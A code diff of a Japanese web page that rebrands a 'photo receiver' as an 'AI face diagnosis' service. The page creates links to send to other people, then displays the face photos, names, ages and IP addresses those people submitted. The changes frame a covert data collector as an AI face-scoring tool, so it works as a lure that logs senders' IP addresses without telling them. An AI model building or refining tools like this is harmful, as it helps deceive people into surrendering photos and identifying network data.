@@ -1,11 +1,11 @@
-```html
 <!DOCTYPE html>
+
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>写真受信</title>
+<title>AI顔診断 写真確認</title>
 
 <style>
 * {
@@ -15,24 +15,25 @@
 body {
   margin: 0;
   padding: 20px;
-  font-family: sans-serif;
-  background: linear-gradient(
-    135deg,
-    #111827,
-    #312e81,
-    #581c87
-  );
-  color: #222;
   min-height: 100vh;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  background:
+    radial-gradient(circle at top, #4338ca, transparent 40%),
+    linear-gradient(135deg, #0f172a, #312e81, #581c87);
+  color: #222;
 }
 
 .container {
-  max-width: 600px;
+  max-width: 620px;
   margin: auto;
-  background: white;
-  padding: 25px;
+}
+
+.card {
+  background: rgba(255,255,255,0.98);
+  padding: 22px;
   border-radius: 24px;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
+  box-shadow: 0 15px 50px rgba(0,0,0,0.3);
+  margin-bottom: 20px;
 }
 
 h1 {
@@ -40,236 +41,392 @@ h1 {
   margin-top: 0;
 }
 
+h2 {
+  margin-top: 0;
+}
+
+.description {
+  color: #666;
+  font-size: 14px;
+  line-height: 1.6;
+}
+
 button {
   width: 100%;
   padding: 15px;
   margin-top: 12px;
   border: none;
-  border-radius: 12px;
+  border-radius: 13px;
   background: #111827;
   color: white;
   font-size: 16px;
+  font-weight: bold;
   cursor: pointer;
 }
 
 button:disabled {
-  background: #aaa;
+  background: #999;
 }
 
-.roomBox {
-  margin-top: 20px;
-  padding: 15px;
-  background: #f3f4f6;
-  border-radius: 14px;
+.copyButton {
+  background: linear-gradient(135deg, #4f46e5, #9333ea);
 }
 
-.roomId {
-  font-weight: bold;
-  word-break: break-all;
+.refreshButton {
+  background: #374151;
 }
 
 .linkBox {
-  margin-top: 15px;
+  display: none;
+  margin-top: 18px;
   padding: 15px;
-  background: #faf5ff;
-  border-radius: 14px;
+  background: #f3f4f6;
+  border-radius: 15px;
+  text-align: left;
+}
+
+.linkLabel {
+  font-size: 13px;
+  color: #666;
+  margin-bottom: 6px;
+}
+
+#diagnosisLink {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ddd;
+  border-radius: 10px;
+  background: white;
+  font-size: 13px;
+}
+
+.roomInfo {
+  margin-top: 12px;
+  font-size: 13px;
+  color: #666;
   word-break: break-all;
 }
 
+.message {
+  display: none;
+  margin-top: 15px;
+  padding: 12px;
+  border-radius: 10px;
+  background: #fee2e2;
+  color: #991b1b;
+  white-space: pre-line;
+}
+
+.successMessage {
+  background: #dcfce7;
+  color: #166534;
+}
+
 .photoList {
-  margin-top: 25px;
+  margin-top: 15px;
 }
 
 .photoCard {
-  margin-top: 20px;
-  padding: 15px;
-  background: #f5f5f7;
+  background: #f8fafc;
   border-radius: 18px;
+  padding: 15px;
+  margin-top: 15px;
+  text-align: left;
 }
 
 .photoCard img {
   display: block;
   width: 100%;
-  margin-top: 15px;
+  max-height: 500px;
+  object-fit: contain;
+  background: #111;
   border-radius: 14px;
+  margin-top: 12px;
+}
+
+.photoTitle {
+  font-size: 18px;
+  font-weight: bold;
 }
 
 .info {
-  margin-top: 8px;
-  line-height: 1.6;
+  margin-top: 6px;
+  font-size: 14px;
+  color: #555;
   word-break: break-word;
 }
 
 .empty {
-  margin-top: 20px;
-  padding: 20px;
-  background: #f3f4f6;
-  border-radius: 14px;
   text-align: center;
+  padding: 25px 10px;
+  color: #777;
+}
+
+.loading {
+  text-align: center;
+  padding: 25px 10px;
   color: #666;
 }
 
+.rankCard {
+  position: relative;
+  background: linear-gradient(135deg, #f8fafc, #eef2ff);
+  border-radius: 18px;
+  padding: 15px;
+  margin-top: 15px;
+  text-align: left;
+  overflow: hidden;
+}
+
+.rankNumber {
+  font-size: 28px;
+  font-weight: bold;
+  margin-bottom: 8px;
+}
+
+.rankPhoto {
+  display: block;
+  width: 100%;
+  max-height: 420px;
+  object-fit: contain;
+  background: #111;
+  border-radius: 14px;
+  margin-top: 10px;
+}
+
+.rankName {
+  font-size: 19px;
+  font-weight: bold;
+  margin-top: 12px;
+}
+
+.rankAge {
+  color: #555;
+  margin-top: 5px;
+}
+
+.rankScore {
+  margin-top: 10px;
+  font-size: 32px;
+  font-weight: bold;
+  color: #4f46e5;
+}
+
+.rankDate {
+  margin-top: 5px;
+  color: #777;
+  font-size: 12px;
+}
+
 .warning {
-  margin-top: 20px;
-  padding: 14px;
+  margin-top: 15px;
+  padding: 13px;
   background: #fff7ed;
   color: #9a3412;
   border-radius: 12px;
-  font-size: 13px;
+  font-size: 12px;
   line-height: 1.6;
 }
-
-.status {
-  margin-top: 15px;
-  color: #555;
-  white-space: pre-wrap;
-}
-
-.copyButton {
-  background: #4f46e5;
-}
-
-.openButton {
-  background: #16a34a;
-}
-
-.checkButton {
-  background: linear-gradient(
-    135deg,
-    #4f46e5,
-    #9333ea
-  );
-}
 </style>
+
 </head>
 
 <body>
 
 <div class="container">
 
-<h1>📷 写真受信</h1>
+<!-- ========================================
+リンク作成
+======================================== -->
 
-<p>
-リンクを作成して、そのリンクから送信された写真を確認できます。
+<div class="card">
+
+<h1>✨ AI顔診断</h1>
+
+<p class="description">
+診断用の専用リンクを作成できます。
+作成したリンクを相手に送ってください。
 </p>
 
-<button id="createLinkButton">
-🔗 リンクを作成
-</button>
+<button
+id="createLinkButton"
+type="button"
 
-
-<div
-  id="roomBox"
-  class="roomBox"
-  style="display:none;"
 >
 
-<strong>ルームID</strong>
-
-<div
-  id="roomId"
-  class="roomId"
-></div>
-
-</div>
-
+🔗 リンクを作成 </button>
 
 <div
   id="linkBox"
   class="linkBox"
-  style="display:none;"
 >
 
-<strong>診断用リンク</strong>
+<div class="linkLabel">
+診断用リンク
+</div>
+
+<input
+id="diagnosisLink"
+readonly
+
+>
 
 <div
-  id="diagnosisLink"
+  id="roomInfo"
+  class="roomInfo"
 ></div>
 
 <button
-  id="copyButton"
-  class="copyButton"
+id="copyButton"
+class="copyButton"
+type="button"
+
 >
-📋 リンクをコピー
-</button>
+
+📋 リンクをコピー </button>
 
 <button
-  id="openButton"
-  class="openButton"
+id="openButton"
+type="button"
+
 >
-🌐 診断ページを開く
-</button>
+
+🚀 診断ページを開く </button>
 
 </div>
 
-
-<button
-  id="checkButton"
-  class="checkButton"
-  style="display:none;"
->
-📷 写真を確認
-</button>
-
-
 <div
-  id="status"
-  class="status"
+  id="linkMessage"
+  class="message"
 ></div>
 
+</div>
+
+<!-- ========================================
+写真確認
+======================================== -->
+
+<div class="card">
+
+<h2>📷 写真を確認</h2>
+
+<p class="description">
+現在のルームに送信された写真を確認できます。
+</p>
+
+<button
+id="checkPhotosButton"
+type="button"
+
+>
+
+📷 写真を確認 </button>
+
+<div
+  id="photoMessage"
+  class="message"
+></div>
+
+<div
+  id="photoLoading"
+  class="loading"
+  style="display:none;"
+>
+写真を読み込んでいます…
+</div>
 
 <div
   id="photoList"
   class="photoList"
 ></div>
 
-
 <div class="warning">
-
-<strong>⚠️ データについて</strong>
-
-<br>
-
-このページでは、写真送信時に登録された
-名前・年齢・IPアドレス・送信日時を表示します。
-
-<br><br>
-
-IPアドレスだけで自宅住所や本名が分かるものではありません。
-写真や個人情報は必要な範囲で適切に管理してください。
-
+IPアドレスは通信経路上の情報です。
+IPアドレスだけで自宅住所や本名が直接分かるわけではありません。
+取得した情報は、利用目的と保存期間を明確にして適切に管理してください。
 </div>
 
 </div>
 
+<!-- ========================================
+歴代ランキング
+======================================== -->
+
+<div class="card">
+
+<h2>🏆 歴代ランキング</h2>
+
+<p class="description">
+ランキング掲載に同意した診断結果のみ表示されます。
+スコアの高い順に表示します。
+</p>
+
+<button
+id="rankingButton"
+class="copyButton"
+type="button"
+
+>
+
+🏆 ランキングを見る </button>
+
+<button
+id="refreshRankingButton"
+class="refreshButton"
+type="button"
+
+>
+
+🔄 ランキングを更新 </button>
+
+<div
+  id="rankingMessage"
+  class="message"
+></div>
+
+<div
+  id="rankingLoading"
+  class="loading"
+  style="display:none;"
+>
+ランキングを読み込んでいます…
+</div>
+
+<div
+  id="rankingList"
+></div>
+
+</div>
+
+</div>
 
 <script>
+
+/*
+========================================
+設定
+========================================
+*/
 
 const PHOTO_RECEIVER_URL =
   "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
 
-
 const DIAGNOSIS_URL =
   "https://gaffney16445.github.io/ai-face-diagnosis/";
-
 
 const STORAGE_KEY =
   "receiverRoom";
 
 
+/*
+========================================
+要素
+========================================
+*/
+
 const createLinkButton =
   document.getElementById(
     "createLinkButton"
-  );
-
-const roomBox =
-  document.getElementById(
-    "roomBox"
-  );
-
-const roomId =
-  document.getElementById(
-    "roomId"
   );
 
 const linkBox =
@@ -282,6 +439,11 @@ const diagnosisLink =
     "diagnosisLink"
   );
 
+const roomInfo =
+  document.getElementById(
+    "roomInfo"
+  );
+
 const copyButton =
   document.getElementById(
     "copyButton"
@@ -292,14 +454,24 @@ const openButton =
     "openButton"
   );
 
-const checkButton =
+const linkMessage =
   document.getElementById(
-    "checkButton"
+    "linkMessage"
   );
 
-const status =
+const checkPhotosButton =
   document.getElementById(
-    "status"
+    "checkPhotosButton"
+  );
+
+const photoMessage =
+  document.getElementById(
+    "photoMessage"
+  );
+
+const photoLoading =
+  document.getElementById(
+    "photoLoading"
   );
 
 const photoList =
@@ -307,13 +479,84 @@ const photoList =
     "photoList"
   );
 
+const rankingButton =
+  document.getElementById(
+    "rankingButton"
+  );
 
-let currentRoom = "";
+const refreshRankingButton =
+  document.getElementById(
+    "refreshRankingButton"
+  );
+
+const rankingMessage =
+  document.getElementById(
+    "rankingMessage"
+  );
+
+const rankingLoading =
+  document.getElementById(
+    "rankingLoading"
+  );
+
+const rankingList =
+  document.getElementById(
+    "rankingList"
+  );
 
 
 /*
 ========================================
-ルームID生成
+現在のルーム
+========================================
+*/
+
+let currentRoom =
+  localStorage.getItem(
+    STORAGE_KEY
+  ) || "";
+
+
+/*
+========================================
+HTMLエスケープ
+========================================
+*/
+
+function escapeHtml(
+  value
+) {
+
+  return String(
+    value ?? ""
+  )
+  .replace(
+    /&/g,
+    "&amp;"
+  )
+  .replace(
+    /</g,
+    "&lt;"
+  )
+  .replace(
+    />/g,
+    "&gt;"
+  )
+  .replace(
+    /"/g,
+    "&quot;"
+  )
+  .replace(
+    /'/g,
+    "&#039;"
+  );
+
+}
+
+
+/*
+========================================
+ルームID作成
 ========================================
 */
 
@@ -347,81 +590,40 @@ function createRoomId() {
 
 /*
 ========================================
-HTMLエスケープ
-========================================
-*/
-
-function escapeHtml(
-  value
-) {
-
-  return String(value ?? "")
-    .replace(
-      /&/g,
-      "&amp;"
-    )
-    .replace(
-      /</g,
-      "&lt;"
-    )
-    .replace(
-      />/g,
-      "&gt;"
-    )
-    .replace(
-      /"/g,
-      "&quot;"
-    )
-    .replace(
-      /'/g,
-      "&#039;"
-    );
-
-}
-
-
-/*
-========================================
 ルーム表示
 ========================================
 */
 
-function showRoom(
-  room
-) {
+function updateRoomDisplay() {
 
-  currentRoom =
-    room;
+  if (!currentRoom) {
 
-  localStorage.setItem(
-    STORAGE_KEY,
-    room
-  );
+    linkBox.style.display =
+      "none";
+
+    return;
+
+  }
 
 
-  const link =
+  const url =
     DIAGNOSIS_URL +
     "?room=" +
     encodeURIComponent(
-      room
+      currentRoom
     );
 
 
-  roomId.textContent =
-    room;
+  diagnosisLink.value =
+    url;
 
 
-  diagnosisLink.textContent =
-    link;
+  roomInfo.textContent =
+    "現在のルームID：" +
+    currentRoom;
 
-
-  roomBox.style.display =
-    "block";
 
   linkBox.style.display =
-    "block";
-
-  checkButton.style.display =
     "block";
 
 }
@@ -435,21 +637,29 @@ function showRoom(
 
 createLinkButton.addEventListener(
   "click",
-  () => {
+  function() {
 
-    const newRoom =
+    currentRoom =
       createRoomId();
 
-    showRoom(
-      newRoom
+
+    localStorage.setItem(
+      STORAGE_KEY,
+      currentRoom
     );
 
 
-    status.textContent =
-      "新しいリンクを作成しました。";
+    updateRoomDisplay();
 
-    photoList.innerHTML =
-      "";
+
+    linkMessage.textContent =
+      "診断用リンクを作成しました。";
+
+    linkMessage.className =
+      "message successMessage";
+
+    linkMessage.style.display =
+      "block";
 
   }
 );
@@ -457,41 +667,59 @@ createLinkButton.addEventListener(
 
 /*
 ========================================
-リンクコピー
+コピー
 ========================================
 */
 
 copyButton.addEventListener(
   "click",
-  async () => {
+  async function() {
 
-    if (!currentRoom) {
+    const url =
+      diagnosisLink.value;
+
+
+    if (!url) {
+
       return;
+
     }
-
-
-    const link =
-      DIAGNOSIS_URL +
-      "?room=" +
-      encodeURIComponent(
-        currentRoom
-      );
 
 
     try {
 
       await navigator.clipboard.writeText(
-        link
+        url
       );
 
 
-      status.textContent =
-        "✅ リンクをコピーしました！";
+      linkMessage.textContent =
+        "リンクをコピーしました！";
+
+      linkMessage.className =
+        "message successMessage";
+
+      linkMessage.style.display =
+        "block";
+
 
     } catch (error) {
 
-      status.textContent =
-        "リンクのコピーに失敗しました。";
+      diagnosisLink.select();
+
+      document.execCommand(
+        "copy"
+      );
+
+
+      linkMessage.textContent =
+        "リンクをコピーしました！";
+
+      linkMessage.className =
+        "message successMessage";
+
+      linkMessage.style.display =
+        "block";
 
     }
 
@@ -507,23 +735,21 @@ copyButton.addEventListener(
 
 openButton.addEventListener(
   "click",
-  () => {
+  function() {
 
-    if (!currentRoom) {
+    if (!diagnosisLink.value) {
+
+      alert(
+        "先にリンクを作成してください。"
+      );
+
       return;
+
     }
 
 
-    const link =
-      DIAGNOSIS_URL +
-      "?room=" +
-      encodeURIComponent(
-        currentRoom
-      );
-
-
     window.open(
-      link,
+      diagnosisLink.value,
       "_blank"
     );
 
@@ -537,31 +763,33 @@ openButton.addEventListener(
 ========================================
 */
 
-checkButton.addEventListener(
+checkPhotosButton.addEventListener(
   "click",
-  async () => {
+  async function() {
+
+    photoMessage.style.display =
+      "none";
+
+
+    photoList.innerHTML =
+      "";
+
 
     if (!currentRoom) {
 
-      status.textContent =
-        "先にリンクを作成してください。";
+      photoMessage.textContent =
+        "先に「リンクを作成」を押してください。";
+
+      photoMessage.style.display =
+        "block";
 
       return;
 
     }
 
 
-    checkButton.disabled =
-      true;
-
-    checkButton.textContent =
-      "📷 読み込み中...";
-
-    status.textContent =
-      "写真を確認しています...";
-
-    photoList.innerHTML =
-      "";
+    photoLoading.style.display =
+      "block";
 
 
     try {
@@ -588,66 +816,42 @@ checkButton.addEventListener(
 
         throw new Error(
           data.error ||
-          "写真一覧の取得に失敗しました。"
+          "写真の取得に失敗しました。"
         );
 
       }
 
 
       if (
-        !data.success
-      ) {
-
-        throw new Error(
-          data.error ||
-          "写真一覧を取得できませんでした。"
-        );
-
-      }
-
-
-      const photos =
-        data.photos || [];
-
-
-      if (
-        photos.length === 0
+        !data.photos ||
+        data.photos.length === 0
       ) {
 
         photoList.innerHTML =
-          `
-          <div class="empty">
-            📷 まだ写真はありません。
-          </div>
-          `;
-
-        status.textContent =
-          "写真はありません。";
+          '<div class="empty">まだ写真はありません。</div>';
 
         return;
 
       }
 
 
-      photos.forEach(
-        (
-          photo,
-          index
-        ) => {
+      data.photos.forEach(
+        function(photo) {
 
           const card =
             document.createElement(
               "div"
             );
 
+
           card.className =
             "photoCard";
 
 
-          const nickname =
+          const name =
             escapeHtml(
               photo.nickname ||
-              "名無し"
+              "未入力"
             );
 
 
@@ -657,78 +861,62 @@ checkButton.addEventListener(
             photo.age !== ""
               ? escapeHtml(
                   photo.age
-                ) + "歳"
+                ) +
+                "歳"
               : "未入力";
 
 
           const ip =
             escapeHtml(
               photo.ip ||
-              "記録なし"
+              "取得できませんでした"
             );
 
 
-          let createdAt =
-            "記録なし";
-
-
-          if (
+          const created =
             photo.created_at
-          ) {
-
-            const date =
-              new Date(
-                photo.created_at
-              );
-
-
-            if (
-              !Number.isNaN(
-                date.getTime()
-              )
-            ) {
-
-              createdAt =
-                date.toLocaleString(
+              ? new Date(
+                  photo.created_at
+                ).toLocaleString(
                   "ja-JP"
-                );
-
-            }
-
-          }
+                )
+              : "不明";
 
 
           card.innerHTML =
-            `
-            <strong>
-              📷 写真 ${index + 1}
-            </strong>
 
-            <div class="info">
-              👤 ${nickname} さん
-            </div>
+            '<div class="photoTitle">' +
+            '📷 写真' +
+            '</div>' +
 
-            <div class="info">
-              🎂 年齢：${age}
-            </div>
+            '<div class="info">' +
+            '👤 ' +
+            name +
+            ' さん' +
+            '</div>' +
 
-            <div class="info">
-              🌐 IP：${ip}
-            </div>
+            '<div class="info">' +
+            '🎂 年齢：' +
+            age +
+            '</div>' +
 
-            <div class="info">
-              🕐 送信日時：${escapeHtml(
-                createdAt
-              )}
-            </div>
+            '<div class="info">' +
+            '🌐 IP：' +
+            ip +
+            '</div>' +
 
-            <img
-              src="${escapeHtml(
-                photo.url
-              )}"
-              alt="受信した写真"
-            >
-            `;
+            '<div class="info">' +
+            '🕐 送信日時：' +
+            escapeHtml(
+              created
+            ) +
+            '</div>' +
+
+            '<img src="' +
+            escapeHtml(
+              photo.url
+            ) +
+            '" alt="送信された写真">';
 
 
           photoList.appendChild(
@@ -739,31 +927,24 @@ checkButton.addEventListener(
       );
 
 
-      status.textContent =
-        "✅ " +
-        photos.length +
-        "枚の写真を確認しました。";
-
-
     } catch (error) {
 
-      console.error(
-        error
-      );
+      console.error(error);
 
 
-      status.textContent =
-        "❌ エラー：\n" +
+      photoMessage.textContent =
+        "写真の取得に失敗しました。\n\n" +
         error.message;
+
+
+      photoMessage.style.display =
+        "block";
 
 
     } finally {
 
-      checkButton.disabled =
-        false;
-
-      checkButton.textContent =
-        "📷 写真を確認";
+      photoLoading.style.display =
+        "none";
 
     }
 
@@ -773,26 +954,232 @@ checkButton.addEventListener(
 
 /*
 ========================================
-前回のルームを復元
+ランキング取得
 ========================================
 */
 
-const savedRoom =
-  localStorage.getItem(
-    STORAGE_KEY
-  );
+async function loadRanking() {
+
+  rankingMessage.style.display =
+    "none";
 
 
-if (
-  savedRoom
-) {
+  rankingList.innerHTML =
+    "";
 
-  showRoom(
-    savedRoom
-  );
 
-  status.textContent =
-    "前回作成したリンクを復元しました。";
+  rankingLoading.style.display =
+    "block";
+
+
+  try {
+
+    const url =
+      PHOTO_RECEIVER_URL +
+      "?ranking=true";
+
+
+    const response =
+      await fetch(
+        url
+      );
+
+
+    const data =
+      await response.json();
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        data.error ||
+        "ランキングの取得に失敗しました。"
+      );
+
+    }
+
+
+    if (
+      !data.rankings ||
+      data.rankings.length === 0
+    ) {
+
+      rankingList.innerHTML =
+        '<div class="empty">' +
+        'まだランキングデータがありません。' +
+        '</div>';
+
+      return;
+
+    }
+
+
+    data.rankings.forEach(
+      function(item, index) {
+
+        const card =
+          document.createElement(
+            "div"
+          );
+
+
+        card.className =
+          "rankCard";
+
+
+        const rank =
+          index + 1;
+
+
+        let rankMark =
+          "🏅";
+
+
+        if (rank === 1) {
+          rankMark = "🥇";
+        } else if (rank === 2) {
+          rankMark = "🥈";
+        } else if (rank === 3) {
+          rankMark = "🥉";
+        }
+
+
+        const name =
+          escapeHtml(
+            item.nickname ||
+            "匿名"
+          );
+
+
+        const age =
+          item.age !== null &&
+          item.age !== undefined &&
+          item.age !== ""
+            ? escapeHtml(
+                item.age
+              ) +
+              "歳"
+            : "年齢非公開";
+
+
+        const score =
+          Number.isFinite(
+            Number(item.score)
+          )
+            ? Number(item.score)
+            : 0;
+
+
+        const created =
+          item.created_at
+            ? new Date(
+                item.created_at
+              ).toLocaleString(
+                "ja-JP"
+              )
+            : "不明";
+
+
+        card.innerHTML =
+
+          '<div class="rankNumber">' +
+          rankMark +
+          ' 第' +
+          rank +
+          '位' +
+          '</div>' +
+
+          '<img class="rankPhoto" ' +
+          'src="' +
+          escapeHtml(
+            item.url
+          ) +
+          '" ' +
+          'alt="ランキング写真">' +
+
+          '<div class="rankName">' +
+          '👤 ' +
+          name +
+          '</div>' +
+
+          '<div class="rankAge">' +
+          '🎂 ' +
+          age +
+          '</div>' +
+
+          '<div class="rankScore">' +
+          '💯 ' +
+          score +
+          ' / 100' +
+          '</div>' +
+
+          '<div class="rankDate">' +
+          '🕐 ' +
+          escapeHtml(
+            created
+          ) +
+          '</div>';
+
+
+        rankingList.appendChild(
+          card
+        );
+
+      }
+    );
+
+
+  } catch (error) {
+
+    console.error(error);
+
+
+    rankingMessage.textContent =
+      "ランキングの取得に失敗しました。\n\n" +
+      error.message;
+
+
+    rankingMessage.style.display =
+      "block";
+
+
+  } finally {
+
+    rankingLoading.style.display =
+      "none";
+
+  }
+
+}
+
+
+/*
+========================================
+ランキングボタン
+========================================
+*/
+
+rankingButton.addEventListener(
+  "click",
+  loadRanking
+);
+
+
+refreshRankingButton.addEventListener(
+  "click",
+  loadRanking
+);
+
+
+/*
+========================================
+保存済みルームを復元
+========================================
+*/
+
+if (currentRoom) {
+
+  updateRoomDisplay();
 
 }
 
@@ -800,4 +1187,3 @@ if (
 
 </body>
 </html>
-```
